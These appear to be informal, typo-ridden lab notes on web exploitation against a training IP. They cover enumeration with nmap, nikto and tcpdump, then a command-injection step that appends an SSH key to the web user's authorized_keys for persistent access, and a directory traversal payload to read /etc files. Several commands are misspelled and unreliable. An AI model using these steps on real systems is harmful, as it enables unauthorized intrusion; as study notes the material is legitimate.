web exploitation
tcpdump 
javascript website stuff
robots.ttxt is for web scrapers to look where stuff is
wevw

enumerate website
robt.txt
/uploads
/chat
/cmd injection
/java
/webxample
/cross

from surving
-acn upload file?

using tools

nmap scripy =http-enum 10.50.28.11 -vv

sudo tcpdump -XXvvnni any tcp prt 80
nikto v -h host
 nikto v -h 10.50.28.11
 sudo apt install nikto

after unning that, go to command injection. do enumeration. find what ur ssh is
go to ur limops
make a ssh key using ssh-keygen
go to the file it says
copy
then run in the website prompt
echo "sshkey" >>var/www/.ssh/authorized_keys
then cat the file
cat var/www/.ssh/authorized_keys

#directory traversal

../../../../../../../../../../../../etc/password in the url or the radio button
assu,ing its not im ho,e directory and is running cat
